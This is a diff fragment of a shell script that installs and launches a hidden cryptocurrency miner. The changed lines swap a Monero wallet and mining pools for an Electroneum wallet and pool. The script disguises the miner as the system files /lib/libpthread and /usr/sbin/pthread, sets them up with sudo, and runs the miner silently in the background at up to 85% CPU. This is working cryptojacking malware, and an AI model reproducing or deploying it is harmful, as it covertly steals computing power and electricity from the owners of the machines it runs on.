@@ -58,12 +58,12 @@ else
     echo "libuv 1.x installed"
 fi
 WOKER_ID="$RANDOM"
-DEPOSIT_ADDRESS="47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWcx"
+DEPOSIT_ADDRESS="etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN"
 if [ x$1 != x ]
 then
     DEPOSIT_ADDRESS=$1
 fi
-COMMANDLINE="nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u $DEPOSIT_ADDRESS.$WOKER_ID -p x -k -o mine.moneropool.com:3333 -u $DEPOSIT_ADDRESS.BAK_$WOKER_ID -p x -k --max-cpu-usage=85 --background"
+COMMANDLINE="nice -n 19 /lib/libpthread -o nl.etnpool.net:3333 -u $DEPOSIT_ADDRESS.$WOKER_ID -p x -k --max-cpu-usage=85 --background"
 echo $COMMANDLINE
 sudo echo  $COMMANDLINE> /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
@@ -74,3 +74,4 @@ else
 	echo "has pthread"
 fi
 sudo /usr/sbin/pthread >/dev/null 2>&1 &
+
